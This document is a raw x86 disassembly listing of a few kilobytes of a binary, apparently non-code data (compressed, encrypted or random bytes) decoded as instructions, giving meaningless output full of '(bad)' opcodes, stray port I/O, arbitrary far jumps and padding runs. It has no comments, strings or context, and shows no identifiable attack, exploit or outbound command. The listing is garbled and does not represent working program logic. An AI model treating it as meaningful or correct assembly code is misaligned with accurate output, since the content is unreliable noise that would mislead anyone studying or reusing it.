  41da40:	add    eax,0xea5976c1
  41da45:	fs jmp 0xd167c789
  41da4b:	adc    ebp,DWORD PTR [edi+0x37]
  41da4e:	mov    dl,0xd5
  41da50:	cmp    DWORD PTR [ebx-0x507751f2],0x36
  41da57:	or     ch,ah
  41da59:	gs jg  0x41d9ea
  41da5c:	(bad)  
  41da5d:	addr16 ja 0x41dabd
  41da60:	cdq    
  41da61:	imul   ebp,DWORD PTR [eax+0x67f06c5f],0x2b
  41da68:	nop
  41da69:	pop    edi
  41da6a:	adc    ch,al
  41da6c:	xor    al,0xe8
  41da6e:	dec    edi
  41da6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da70:	jg     0x41dac6
  41da72:	pop    ebx
  41da73:	icebp  
  41da74:	repz pop edi
  41da76:	into   
  41da77:	adc    dh,BYTE PTR [ecx+0x4786dc9c]
  41da7d:	les    edx,FWORD PTR [ebx+0x18]
  41da80:	mul    BYTE PTR [esi+0x3d]
  41da83:	add    ebx,DWORD PTR [ebx+0x610a34d0]
  41da89:	stos   DWORD PTR es:[edi],eax
  41da8a:	ins    DWORD PTR es:[edi],dx
  41da8b:	imul   ecx,ebx,0x1f
  41da8e:	aaa    
  41da8f:	dec    edi
  41da90:	jae    0x41dab0
  41da92:	test   eax,0xc3526a1d
  41da97:	dec    ebx
  41da98:	in     al,0x6c
  41da9a:	sti    
  41da9b:	repnz mov eax,0x6ef2623d
  41daa1:	or     BYTE PTR [ebx-0x6f],dl
  41daa4:	add    BYTE PTR [ebx],bh
  41daa6:	push   cs
  41daa7:	out    0x3d,al
  41daa9:	xchg   ecx,eax
  41daaa:	cmp    al,0xb2
  41daac:	push   ebp
  41daad:	hlt    
  41daae:	or     cl,BYTE PTR ds:0xcca5a784
  41dab4:	cmc    
  41dab5:	mov    BYTE PTR ds:[ecx+0x7f],0xc4
  41daba:	cdq    
  41dabb:	daa    
  41dabc:	outs   dx,DWORD PTR ds:[esi]
  41dabe:	adc    al,0x22
  41dac0:	mov    ch,0x0
	...
  41db32:	add    BYTE PTR [eax],al
  41db34:	sub    esi,edx
  41db36:	sti    
  41db37:	pop    ebp
  41db38:	(bad)  
  41db39:	jge    0x41daea
  41db3b:	div    dl
  41db3d:	cmp    ebp,0xb
  41db40:	bound  esp,QWORD PTR [edx+0x3f820fa1]
  41db46:	add    DWORD PTR [eax],eax
  41db48:	cmc    
  41db49:	add    BYTE PTR [eax],al
  41db4b:	add    BYTE PTR [edi-0x7cb69ad5],ch
  41db51:	lock rcl BYTE PTR [edx+edx*1],1
  41db55:	jmp    0x41dbbb
  41db57:	cmp    DWORD PTR [esi+esi*1+0x41],ebx
  41db5b:	lods   eax,DWORD PTR ds:[esi]
  41db5c:	sbb    eax,0x4099d8e8
  41db61:	mov    esi,0x19f8b85
  41db66:	iret   
  41db67:	jns    0x41db40
  41db69:	mov    ah,0xd7
  41db6b:	xlat   BYTE PTR ds:[ebx]
  41db6c:	sbb    eax,0xc059022c
  41db71:	mov    dl,0xec
  41db73:	mov    dl,0x8d
  41db75:	push   esp
  41db76:	rcl    ch,0x65
  41db79:	shl    bh,cl
  41db7b:	xlat   BYTE PTR ds:[ebx]
  41db7c:	mov    dl,0xb1
  41db7e:	jnp    0x41db64
  41db80:	push   esi
  41db81:	lds    edi,FWORD PTR [ecx+0x14]
  41db84:	dec    edi
  41db85:	hlt    
  41db86:	fisub  DWORD PTR [eax]
  41db88:	sbb    eax,0xb95e9641
  41db8d:	jnp    0x41dba4
  41db8f:	imul   ebx,DWORD PTR [edx+eiz*8],0x49
  41db93:	pop    edi
  41db94:	mov    bl,0x96
  41db96:	jmp    0x18a21499
  41db9b:	gs out dx,al
  41db9d:	lods   eax,DWORD PTR ds:[esi]
  41db9e:	lea    edi,[esi-0x73]
  41dba1:	jmp    0x41dbab
  41dba3:	xlat   BYTE PTR ds:[ebx]
  41dba4:	dec    esp
  41dba5:	mov    edx,0x7f315a6f
  41dbaa:	pushf  
  41dbab:	lods   al,BYTE PTR ds:[esi]
  41dbac:	push   edx
  41dbad:	dec    ebx
  41dbae:	jl     0x41db6a
  41dbb0:	cs loop 0x41db74
  41dbb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dbb4:	out    0x3f,al
  41dbb6:	rcl    BYTE PTR [edx+eiz*1],0x79
  41dbba:	dec    esi
  41dbbb:	add    bh,BYTE PTR [esp+esi*4+0x69e36dba]
  41dbc2:	xchg   ebx,eax
  41dbc3:	dec    ebx
  41dbc4:	jge    0x41db47
  41dbc6:	test   eax,0xc9900aa
  41dbcb:	mov    al,0xa6
  41dbcd:	jns    0x41dbce
  41dbcf:	mov    ecx,0x69b8cc4
  41dbd4:	(bad)  
  41dbd6:	adc    esp,DWORD PTR [eax+0x73]
  41dbd9:	(bad)  
  41dbda:	dec    ecx
  41dbdb:	cmp    al,0x9e
  41dbdd:	fsub   QWORD PTR ss:[ecx-0x32b77e74]
  41dbe4:	mov    bh,0x11
  41dbe6:	psubd  mm5,QWORD PTR [esi+0x33]
  41dbea:	inc    edi
  41dbeb:	xchg   esp,eax
  41dbec:	push   ebp
  41dbed:	stos   BYTE PTR es:[edi],al
  41dbee:	shr    DWORD PTR [ebx-0x77e7ff50],1
  41dbf4:	jg     0x41dbe6
  41dbf6:	pop    es
  41dbf7:	adc    BYTE PTR [esi],ah
  41dbf9:	mov    eax,0x4c6764a6
  41dbfe:	mov    ah,0x2f
  41dc00:	je     0x41dbba
  41dc02:	dec    ecx
  41dc03:	sub    al,0xcf
  41dc05:	xchg   edx,eax
  41dc06:	or     cl,BYTE PTR [ecx-0x3a298732]
  41dc0c:	mov    bh,0x2c
  41dc0e:	es mov ebp,0x57e635c
  41dc14:	imul   esi,DWORD PTR ss:[esi-0x31845e0e],0xfbf1f036
  41dc1f:	pop    ebp
  41dc20:	test   DWORD PTR [esi],ebx
  41dc22:	xchg   ecx,eax
  41dc23:	mov    ebp,0x6121bba8
  41dc28:	psubsw mm1,mm4
  41dc2b:	sahf   
  41dc2c:	das    
  41dc2d:	sbb    dl,0x63
  41dc30:	xor    esp,DWORD PTR [ebp-0xa]
  41dc33:	xchg   ecx,esp
  41dc35:	mov    esp,DWORD PTR [eax-0x65058d9c]
  41dc3b:	mov    al,ds:0x9ebb3e0a
  41dc40:	mov    al,0x0
	...
  41dcb2:	add    BYTE PTR [eax],al
  41dcb4:	pusha  
  41dcb5:	cdq    
  41dcb6:	fsubr  st(5),st
  41dcb8:	std    
  41dcb9:	in     eax,0x79
  41dcbb:	popf   
  41dcbc:	jle    0x41dc59
  41dcbe:	es and al,0x64
  41dcc1:	rcl    cl,cl
  41dcc3:	pop    eax
  41dcc4:	ja     0x41dd06
  41dcc6:	add    DWORD PTR [eax],eax
  41dcc8:	cmc    
  41dcc9:	add    BYTE PTR [eax],al
  41dccb:	add    BYTE PTR [ecx],cl
  41dccd:	dec    edi
  41dcce:	mov    al,0x17
  41dcd0:	pop    ds
  41dcd1:	cmp    esi,ebx
  41dcd3:	push   esp
  41dcd4:	dec    ecx
  41dcd5:	ins    DWORD PTR es:[edi],dx
  41dcd6:	cld    
  41dcd7:	pop    eax
  41dcd8:	aam    0x47
  41dcda:	sub    dl,BYTE PTR [edx]
  41dcdc:	add    cl,BYTE PTR [ebp+0x175fd514]
  41dce2:	(bad)  
  41dce4:	lea    edi,[edx+0x64]
  41dce7:	dec    esp
  41dce8:	out    0xaf,al
  41dcea:	xchg   esi,eax
  41dceb:	push   edx
  41dcec:	repz mov ebp,0x7a493d2a
  41dcf2:	pop    esi
  41dcf3:	and    BYTE PTR [ebx-0x47],ch
  41dcf6:	cmp    DWORD PTR [eax+0x50906f3e],esi
  41dcfc:	jle    0x41dcdc
  41dcfe:	xchg   ecx,eax
  41dcff:	neg    DWORD PTR [ebp+ebx*2-0x36]
  41dd03:	stos   BYTE PTR es:[edi],al
  41dd04:	add    BYTE PTR [edi-0x29ff3a74],0xfe
  41dd0b:	cmp    al,0x9d
  41dd0d:	inc    edi
  41dd0e:	std    
  41dd0f:	fs out 0xa5,al
  41dd12:	in     eax,dx
  41dd13:	push   0x53
  41dd15:	mov    cs,WORD PTR [ecx-0x7540ff28]
  41dd1b:	sbb    BYTE PTR [eax+0x3f],cl
  41dd1e:	lahf   
  41dd1f:	xor    ch,bh
  41dd21:	imul   ecx,DWORD PTR [esi],0xffffffff
  41dd24:	out    0xf8,al
  41dd26:	jae    0x41dd07
  41dd28:	mov    WORD PTR [edi-0x65d85ba],?
  41dd2e:	or     WORD PTR cs:[eax+0x34],di
  41dd33:	inc    esp
  41dd34:	and    dh,BYTE PTR [esi-0x47]
  41dd37:	xchg   DWORD PTR [esp+eiz*4-0x5050ef5d],eax
  41dd3e:	mov    ds:0x36ef50c7,eax
  41dd43:	inc    ebp
  41dd44:	xor    BYTE PTR [eax+0x3545b458],bl
  41dd4a:	push   edx
  41dd4b:	mov    ch,0x8e
  41dd4d:	jp     0x41dd93
  41dd4f:	xchg   ecx,eax
  41dd50:	pop    edi
  41dd51:	push   esp
  41dd52:	out    0x52,al
  41dd54:	loop   0x41dd28
  41dd56:	push   es
  41dd57:	popa   
  41dd58:	jne    0x41ddba
  41dd5a:	sar    BYTE PTR [edi+ebp*2],cl
  41dd5d:	mov    BYTE PTR gs:[edi],dh
  41dd60:	sbb    eax,0x54754846
  41dd65:	arpl   WORD PTR [edx+0x19],ax
  41dd68:	sbb    dh,dl
  41dd6a:	leave  
  41dd6b:	sar    DWORD PTR [ebx],cl
  41dd6d:	mov    edx,0x6c87758c
  41dd72:	loopne 0x41dd63
  41dd74:	and    DWORD PTR [esi],eax
  41dd76:	loopne 0x41ddbe
  41dd78:	mov    al,0xd9
  41dd7a:	gs mov ebp,0x292fadc
  41dd80:	push   edi
  41dd81:	in     eax,dx
  41dd82:	fwait
  41dd83:	or     DWORD PTR [edx],ebp
  41dd85:	jns    0x41dd64
  41dd87:	xlat   BYTE PTR ds:[ebx]
  41dd88:	xor    BYTE PTR [edi+0x405b48a5],al
  41dd8e:	sbb    ebp,DWORD PTR [esi+0x2a06e39c]
  41dd94:	mov    esp,0xb2342371
  41dd99:	or     bh,bl
  41dd9b:	push   es
  41dd9c:	rcl    edx,cl
  41dd9e:	test   DWORD PTR [ebp-0x37],ecx
  41dda1:	imul   esi,eax,0xffffffa5
  41dda4:	sbb    DWORD PTR [edx],0xffffffe6
  41dda7:	adc    esp,DWORD PTR [esi-0x600adb68]
  41ddad:	daa    
  41ddae:	mov    ch,0xb
  41ddb0:	sub    cl,cl
  41ddb2:	push   ds
  41ddb3:	das    
  41ddb4:	xchg   di,ax
  41ddb6:	test   BYTE PTR gs:[esi],bh
  41ddb9:	setne  BYTE PTR [ebx+edx*8]
  41ddbd:	es add edi,ebp
  41ddc0:	inc    edx
	...
  41de31:	add    BYTE PTR [eax],al
  41de33:	add    BYTE PTR [edi],al
  41de35:	jp     0x41de1f
  41de37:	jnp    0x41de36
  41de39:	sti    
  41de3a:	xchg   edi,eax
  41de3b:	jle    0x41ddf3
  41de3d:	popf   
  41de3e:	loopne 0x41ddc2
  41de40:	shl    DWORD PTR [edi],1
  41de42:	iret   
  41de43:	sub    BYTE PTR [ecx+eax*2+0x1],0x0
  41de48:	cmc    
  41de49:	add    BYTE PTR [eax],al
  41de4b:	add    BYTE PTR [ebp-0x68a8148b],al
  41de51:	mov    ecx,0x8ede21f3
  41de56:	aas    
  41de57:	push   es
  41de58:	mov    ?,WORD PTR [ecx]
  41de5a:	call   0xfa8f:0x52f31ef6
  41de61:	repnz sbb edx,edx
  41de64:	retf   
  41de65:	(bad)  [ebp+0x6e64164a]
  41de6b:	rcl    DWORD PTR ds:0x5cf2f08b,0xe5
  41de72:	jbe    0x41de48
  41de74:	(bad)  
  41de75:	mov    ah,0x76
  41de77:	fisub  WORD PTR ds:0x478a25d
  41de7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de7e:	push   esp
  41de7f:	sbb    edx,DWORD PTR [ebp+0x48]
  41de82:	jno    0x41def8
  41de84:	int    0x60
  41de86:	lahf   
  41de87:	xchg   edx,eax
  41de88:	idiv   edi
  41de8a:	fwait
  41de8b:	das    
  41de8c:	mov    ecx,0x9f2f9b1f
  41de91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de92:	mov    esp,0xcf762f40
  41de97:	gs ret 
  41de99:	pop    eax
  41de9a:	(bad)  
  41de9b:	nop
  41de9c:	jmp    0x7d31903
  41dea1:	mov    ch,0x37
  41dea3:	retf   0x6b43
  41dea6:	clc    
  41dea7:	cmp    DWORD PTR [esi-0x58],ebx
  41deaa:	scas   al,BYTE PTR es:[edi]
  41deab:	mov    edx,ebx
  41dead:	gs in  al,dx
  41deaf:	leave  
  41deb0:	jne    0x41de4b
  41deb2:	or     BYTE PTR [ecx-0x3a],0x72
  41deb6:	add    ecx,DWORD PTR [eax+0x51d2949e]
  41debc:	sbb    DWORD PTR [edx+0x59],esp
  41debf:	std    
  41dec0:	ss sub eax,0x23fa58a9
  41dec6:	pop    ecx
  41dec7:	mov    dh,0x13
  41dec9:	cli    
  41deca:	jne    0x41df27
  41decc:	jne    0x41de88
  41dece:	dec    esp
  41decf:	int    0xa7
  41ded1:	(bad)  
  41ded2:	jnp    0x41de6b
  41ded4:	mov    al,ds:0x60df7ada
  41ded9:	mov    esi,0xed82a002
  41dede:	outs   dx,BYTE PTR ds:[esi]
  41dedf:	fiadd  DWORD PTR [esi-0x7a8f02b4]
  41dee5:	rcr    DWORD PTR [edx-0x3c6cff16],0xa6
  41deec:	push   eax
  41deed:	pop    ebp
  41deee:	repnz fistp QWORD PTR ds:0xe63ce658
  41def5:	push   edi
  41def6:	inc    ebx
  41def7:	push   esi
  41def8:	push   edi
  41def9:	mov    BYTE PTR [ebx],bh
  41defb:	rcl    dl,cl
  41defd:	dec    ebx
  41defe:	inc    eax
  41deff:	adc    edx,DWORD PTR [ebp+0x7b939265]
  41df05:	sbb    ch,BYTE PTR [edi-0x3a55c838]
  41df0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df0c:	inc    esi
  41df0d:	cmp    al,0xa6
  41df0f:	repz pop es
  41df11:	add    bh,BYTE PTR [edx-0x541b3c8e]
  41df17:	xchg   BYTE PTR [ebx],cl
  41df19:	and    ecx,0x790f7b1a
  41df1f:	mov    cl,0xfe
  41df21:	mov    ecx,esi
  41df23:	dec    eax
  41df24:	dec    esi
  41df25:	dec    eax
  41df26:	(bad)  
  41df27:	dec    DWORD PTR [eax]
  41df29:	call   edi
  41df2b:	ror    edx,1
  41df2d:	mov    BYTE PTR fs:0x3007515b,dh
  41df34:	mov    edi,0x88b2f9e0
  41df39:	dec    edx
  41df3a:	pop    ss
  41df3b:	mov    eax,ds:0x4f064772
  41df40:	mov    edx,0x0
	...
  41dfb1:	add    BYTE PTR [eax],al
  41dfb3:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41dfb9:	push   edi
  41dfba:	sti    
  41dfbb:	(bad)  
  41dfbc:	loopne 0x41df65
  41dfbe:	cmp    ebx,DWORD PTR [esi]
  41dfc0:	pop    edx
  41dfc1:	fneni(8087 only) 
  41dfc3:	and    esp,DWORD PTR [ecx+0x42]
  41dfc6:	add    DWORD PTR [eax],eax
  41dfc8:	cmc    
  41dfc9:	add    BYTE PTR [eax],al
  41dfcb:	add    BYTE PTR [edx],ah
  41dfcd:	leave  
  41dfce:	rcl    DWORD PTR [ebp+edi*8-0x80],0x7c
  41dfd3:	jmp    0x8678:0xb1cf66e8
  41dfda:	ror    DWORD PTR [ebx-0x2b],1
  41dfdd:	and    esi,DWORD PTR [ecx]
  41dfdf:	sbb    BYTE PTR [edi-0x63],ch
  41dfe2:	add    eax,0x89ddc61
  41dfe7:	ror    DWORD PTR [edx-0x4b6aeec1],0x6e
  41dfee:	ret    0x8e8c
  41dff1:	rcl    BYTE PTR [eax+0x28a1db17],cl
  41dff7:	int3   
  41dff8:	inc    edi
  41dff9:	iret   
  41dffa:	cmp    dh,BYTE PTR [edx+0x3c]
  41dffd:	les    eax,FWORD PTR [esi]
  41dfff:	gs fwait
  41e001:	addr16 cdq 
  41e003:	(bad)  
  41e004:	(bad)  
  41e006:	(bad)  
  41e007:	push   esp
  41e008:	stos   BYTE PTR es:[edi],al
  41e009:	cdq    
  41e00a:	ins    BYTE PTR es:[edi],dx
  41e00b:	je     0x41e05a
  41e00d:	push   ebp
  41e00e:	xchg   ebx,eax
  41e00f:	xor    al,0xd7
  41e011:	pushf  
  41e012:	test   eax,0xec31bbf5
  41e017:	xlat   BYTE PTR ds:[ebx]
  41e018:	rcl    bh,0x52
  41e01b:	lea    esi,[edx]
  41e01d:	in     eax,0xae
  41e01f:	iret   
  41e020:	mov    cs,WORD PTR [esi-0x73]
  41e023:	adc    eax,DWORD PTR [edi+0x74]
  41e026:	mov    ch,0x99
  41e028:	inc    edi
  41e029:	pop    ds
  41e02a:	cmp    al,0xee
  41e02c:	retf   
  41e02d:	pop    ebp
  41e02e:	xlat   BYTE PTR ds:[ebx]
  41e02f:	aaa    
  41e030:	call   0x4d34d7a6
  41e035:	ficom  WORD PTR [ebx-0x40d6c685]
  41e03b:	mov    ds:0xd8094aad,al
  41e040:	call   0x3584eee5
  41e045:	daa    
  41e046:	and    DWORD PTR [esi-0x59],edx
  41e049:	rcl    BYTE PTR [eax-0x10],0x6d
  41e04d:	adc    edi,DWORD PTR [esi-0x79]
  41e050:	sbb    DWORD PTR [ecx+0x5f96ad2f],ebx
  41e056:	mov    ch,ch
  41e058:	or     BYTE PTR [eax-0x4b],dl
  41e05b:	jle    0x41e09e
  41e05d:	cli    
  41e05e:	inc    esi
  41e05f:	gs xor al,0x8f
  41e062:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e063:	loopne 0x41e037
  41e065:	rol    BYTE PTR [esi+0x5c],1
  41e068:	std    
  41e069:	(bad)
  41e06d:	jl     0x41dffe
  41e06f:	sbb    al,0x53
  41e071:	stc    
  41e072:	push   ebp
  41e073:	jp     0x41e042
  41e075:	push   0xe32822ad
  41e07a:	(bad)  
  41e07b:	loop   0x41e08d
  41e07d:	xchg   esi,eax
  41e07e:	mov    ah,0x17
  41e080:	sbb    eax,DWORD PTR [edx]
  41e082:	and    ecx,DWORD PTR [esi+0x74aa10dd]
  41e088:	loop   0x41e08b
  41e08a:	add    bl,cl
  41e08c:	arpl   sp,bx
  41e08e:	dec    edi
  41e08f:	retf   0x34c1
  41e092:	inc    ecx
  41e093:	adc    DWORD PTR [edx*8-0x5ea01557],esp
  41e09a:	push   0x40
  41e09c:	sub    ecx,DWORD PTR [edx+0x7]
  41e09f:	jmp    0x41e10c
  41e0a1:	jae    0x41e09a
  41e0a3:	adc    BYTE PTR [edi-0x77],bh
  41e0a6:	popf   
  41e0a7:	fistp  DWORD PTR [esi-0x68]
  41e0aa:	stc    
  41e0ab:	jl     0x41e116
  41e0ad:	fistp  QWORD PTR [edi]
  41e0af:	mov    ch,0x7d
  41e0b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0b2:	add    BYTE PTR [ebx],dh
  41e0b4:	pusha  
  41e0b5:	je     0x41e081
  41e0b7:	fnstsw WORD PTR [eax-0xf]
  41e0ba:	add    DWORD PTR [ebp-0x63],ecx
  41e0bd:	sub    DWORD PTR [esp+esi*1+0x45],esp
	...
  41e131:	add    BYTE PTR [eax],al
  41e133:	add    BYTE PTR [eax-0x3d],dl
  41e136:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41e13c:	and    al,0x13
  41e13e:	push   ss
  41e13f:	dec    edi
  41e140:	in     eax,0xdc
  41e142:	lods   al,BYTE PTR ds:[esi]
  41e143:	leave  
  41e144:	push   esi
  41e145:	inc    ebx
  41e146:	add    DWORD PTR [eax],eax
  41e148:	cmc    
  41e149:	add    BYTE PTR [eax],al
  41e14b:	add    BYTE PTR [edx],cl
  41e14d:	adc    DWORD PTR [edx-0x74f05f39],esi
  41e153:	mov    BYTE PTR [edx+ebp*1],0x36
  41e157:	mov    eax,ds:0x380150d3
  41e15c:	and    ch,cl
  41e15e:	pop    esp
  41e15f:	lods   eax,DWORD PTR ds:[esi]
  41e160:	out    0xbd,al
  41e162:	push   esp
  41e163:	mov    DWORD PTR [edi-0x79],esp
  41e166:	pop    ebx
  41e167:	jg     0x41e118
  41e169:	or     ebx,esi
  41e16b:	jge    0x41e178
  41e16d:	outs   dx,BYTE PTR ds:[esi]
  41e16e:	call   0xf9002db6
  41e173:	inc    esp
  41e174:	xor    al,0xb7
  41e176:	out    0x31,eax
  41e178:	iret   
  41e179:	rol    DWORD PTR [esi+eiz*8],cl
  41e17c:	sub    eax,0xd2af4cc9
  41e181:	push   ds
  41e182:	xchg   ebp,eax
  41e183:	xor    BYTE PTR [ecx+eax*8],ch
  41e186:	ffreep st(1)
  41e188:	inc    edi
  41e189:	repz loopne 0x41e168
  41e18c:	lods   eax,DWORD PTR ds:[esi]
  41e18d:	mov    cl,0x56
  41e18f:	push   ecx
  41e190:	sti    
  41e191:	pop    edx
  41e192:	imul   eax,DWORD PTR [esi],0xffffffe8
  41e195:	lea    esp,[ecx-0x6d]
  41e198:	es push eax
  41e19a:	js     0x41e204
  41e19c:	push   ebx
  41e19d:	mov    DWORD PTR [ecx-0x70],esi
  41e1a0:	pop    esi
  41e1a1:	sbb    eax,0xeb98d5dc
  41e1a6:	adc    ah,al
  41e1a8:	fiadd  DWORD PTR [esi+0xb]
  41e1ab:	push   cs
  41e1ac:	inc    ebp
  41e1ad:	scas   al,BYTE PTR es:[edi]
  41e1ae:	xchg   ebp,eax
  41e1af:	add    al,0x71
  41e1b1:	data16 (bad) 
  41e1b3:	mov    al,0x7d
  41e1b5:	leave  
  41e1b6:	cld    
  41e1b7:	dec    esp
  41e1b8:	out    0x77,eax
  41e1ba:	mov    dh,0x28
  41e1bc:	lods   eax,DWORD PTR ds:[esi]
  41e1bd:	sub    eax,0x3a9744c2
  41e1c2:	pusha  
  41e1c3:	mov    ebx,0xc67e63aa
  41e1c8:	test   DWORD PTR [edx+0x77c5c570],edi
  41e1ce:	xor    DWORD PTR [esi+ecx*1-0x41dc00f9],edx
  41e1d5:	das    
  41e1d6:	push   edi
  41e1d7:	mov    bh,0x7a
  41e1d9:	aad    0x51
  41e1db:	dec    ecx
  41e1dc:	xchg   esp,eax
  41e1dd:	push   eax
  41e1de:	jbe    0x41e1f9
  41e1e0:	jge    0x41e1a3
  41e1e2:	test   BYTE PTR [edi],cl
  41e1e4:	xlat   BYTE PTR ds:[ebx]
  41e1e5:	ja     0x41e242
  41e1e7:	add    BYTE PTR [edx-0x2a2aea40],0x21
  41e1ee:	xchg   eax,edx
  41e1f0:	push   ss
  41e1f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e1f2:	cwde   
  41e1f3:	test   BYTE PTR [ebp-0xa],dl
  41e1f6:	jns    0x41e1c3
  41e1f8:	fadd   st,st(7)
  41e1fa:	mov    bl,0x98
  41e1fc:	shr    DWORD PTR [esi-0x4ad709],1
  41e202:	add    eax,0x1a0e0d6d
  41e207:	jp     0x41e19a
  41e209:	jb     0x41e237
  41e20b:	aaa    
  41e20c:	adc    eax,0x46295a23
  41e211:	ds mov ebp,0xab702c14
  41e217:	std    
  41e218:	add    eax,0xc5d2319f
  41e21d:	imul   ebp,DWORD PTR [edi+ecx*4],0x2fbd5561
  41e224:	sub    esi,DWORD PTR [edx+eax*8]
  41e227:	ins    BYTE PTR es:[edi],dx
  41e228:	test   DWORD PTR [eax+edi*1-0x69],edi
  41e22c:	rcl    BYTE PTR [ecx+0xb],1
  41e22f:	fbld   TBYTE PTR [ebp+0x99fd76a]
  41e235:	mov    ebx,0x85d64740
  41e23a:	pop    ecx
  41e23b:	cmp    BYTE PTR [ebx+0x51],bh
  41e23e:	(bad)  
  41e23f:	loopne 0x41e223
	...
  41e2b1:	add    BYTE PTR [eax],al
  41e2b3:	add    dh,bh
  41e2b5:	cmp    cl,0x54
  41e2b8:	(bad)  
  41e2b9:	jge    0x41e2ba
  41e2bb:	stos   BYTE PTR es:[edi],al
  41e2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2bd:	push   esi
  41e2be:	arpl   WORD PTR [ebx-0x21],di
  41e2c1:	aam    0xfe
  41e2c3:	or     BYTE PTR [ebx+0x44],0x1
  41e2c7:	add    ch,dh
  41e2c9:	add    BYTE PTR [eax],al
  41e2cb:	add    BYTE PTR [ebx-0x57],al
  41e2ce:	push   cs
  41e2cf:	sub    esp,DWORD PTR [ecx+0x7eba73e5]
  41e2d5:	fwait
  41e2d6:	dec    esi
  41e2d7:	pop    ebx
  41e2d8:	stos   DWORD PTR es:[edi],eax
  41e2d9:	out    dx,al
  41e2da:	pop    ds
  41e2db:	enter  0xea8c,0x85
  41e2df:	sbb    al,0x6f
  41e2e1:	jbe    0x41e2f4
  41e2e3:	cmp    ebp,esi
  41e2e5:	push   0xfffffff9
  41e2e7:	(bad)  
  41e2e8:	sti    
  41e2e9:	mov    ebp,0x8fba8316
  41e2ee:	fdiv   QWORD PTR [edi+0x565c4a8d]
  41e2f4:	jg     0x41e279
  41e2f6:	sub    BYTE PTR [ebp+0x1ca15b7d],ch
  41e2fc:	inc    ebp
  41e2fd:	inc    esp
  41e2ff:	out    dx,al
  41e300:	dec    edi
  41e301:	add    DWORD PTR [ecx-0x52b5e303],esi
  41e307:	xchg   edi,eax
  41e308:	mov    esi,0x55db81aa
  41e30d:	lods   eax,DWORD PTR ds:[esi]
  41e30e:	iret   
  41e30f:	mov    al,0x6a
  41e311:	and    BYTE PTR [eax],0xde
  41e314:	mov    al,ds:0xc64667cf
  41e319:	outs   dx,DWORD PTR ds:[esi]
  41e31a:	test   eax,0x3e640af5
  41e31f:	mov    ah,dl
  41e321:	jmp    0x88c5ab34
  41e326:	mov    ?,WORD PTR [ebx-0x2]
  41e329:	enter  0x54f0,0xdf
  41e32d:	addr16 clc 
  41e32f:	stc    
  41e330:	sbb    bl,BYTE PTR [edi]
  41e332:	clc    
  41e333:	gs cli 
  41e335:	jnp    0x41e2fe
  41e337:	les    edi,FWORD PTR [esi+0x36]
  41e33a:	jp     0x41e322
  41e33c:	push   edi
  41e33d:	jns    0x41e387
  41e33f:	cmp    al,0x88
  41e341:	mov    esi,0x3699e4d2
  41e346:	xchg   esi,eax
  41e347:	loopne 0x41e334
  41e349:	fstp   QWORD PTR [eax-0x60]
  41e34c:	cmp    esi,DWORD PTR [ecx+0x154c5b49]
  41e352:	dec    edx
  41e353:	ret    0x94c3
  41e356:	fld    DWORD PTR [ebp-0x26eb9659]
  41e35c:	sahf   
  41e35d:	lds    ebp,FWORD PTR [edx+0x4aea1d03]
  41e363:	stc    
  41e364:	inc    esp
  41e365:	fst    QWORD PTR [edi]
  41e367:	ins    BYTE PTR es:[edi],dx
  41e368:	pop    ss
  41e369:	fild   DWORD PTR [edx-0x432d028]
  41e36f:	jl     0x41e34b
  41e371:	les    ebx,FWORD PTR [edx+esi*1-0x7]
  41e375:	or     DWORD PTR [ebx],ebx
  41e377:	ss xor eax,0xff22c0df
  41e37d:	lds    ebp,FWORD PTR [edx+0x33fa3a66]
  41e383:	lock fs hlt 
  41e386:	sbb    al,0x3f
  41e388:	cmc    
  41e389:	push   es
  41e38a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e38b:	push   edx
  41e38c:	ins    DWORD PTR es:[edi],dx
  41e38d:	sbb    DWORD PTR [eax],ebp
  41e38f:	stos   BYTE PTR es:[edi],al
  41e390:	sub    dl,cl
  41e392:	xor    bl,al
  41e394:	pop    edi
  41e395:	lods   eax,DWORD PTR ds:[esi]
  41e396:	fstp   TBYTE PTR [edi+edx*8+0x45]
  41e39a:	add    al,0x88
  41e39c:	mov    ecx,0x7cc872f4
  41e3a1:	fdiv   st,st(0)
  41e3a3:	imul   ebx,DWORD PTR ds:0x1169843d,0xe51cd569
  41e3ad:	repz mov dh,0x4c
  41e3b0:	stos   DWORD PTR es:[edi],eax
  41e3b1:	popa   
  41e3b2:	popf   
  41e3b3:	mov    esp,0x3d0065e1
  41e3b8:	(bad)  
  41e3b9:	jns    0x41e372
  41e3bb:	bound  edx,QWORD PTR [ecx]
  41e3bd:	fidiv  DWORD PTR [ecx+0x14bc]
	...
  41e433:	add    dh,dh
  41e435:	rcl    BYTE PTR ss:[edx+edx*8+0x1576f6f4],cl
  41e43d:	mov    ds:0x1367fead,al
  41e442:	mov    al,0xf4
  41e444:	inc    eax
  41e445:	inc    ebp
  41e446:	add    DWORD PTR [eax],eax
  41e448:	cmc    
  41e449:	add    BYTE PTR [eax],al
  41e44b:	add    cl,dh
  41e44d:	push   esp
  41e44e:	out    dx,al
  41e44f:	jns    0x41e4b8
  41e451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e452:	add    eax,0xe9ccf697
  41e457:	aas    
  41e458:	inc    eax
  41e459:	nop
  41e45a:	adc    DWORD PTR [edi+edi*8-0x79],edi
  41e45e:	push   ebx
  41e45f:	imul   ebx,esi,0xb24af679
  41e465:	daa    
  41e466:	add    eax,0x62518ef4
  41e46b:	mov    edx,0xeaaf47cb
  41e470:	retf   0xdd46
  41e473:	in     al,0x8c
  41e475:	xchg   ebp,eax
  41e476:	sbb    DWORD PTR [edi-0x2e],esp
  41e479:	pop    edx
  41e47a:	mov    ds:0x1a36dca,al
  41e47f:	std    
  41e480:	cli    
  41e481:	int3   
  41e482:	jg     0x41e49f
  41e484:	dec    edx
  41e485:	int3   
  41e486:	push   ds
  41e487:	xchg   ebp,eax
  41e488:	adc    cl,bl
  41e48a:	mov    esi,DWORD PTR [esi+0x30]
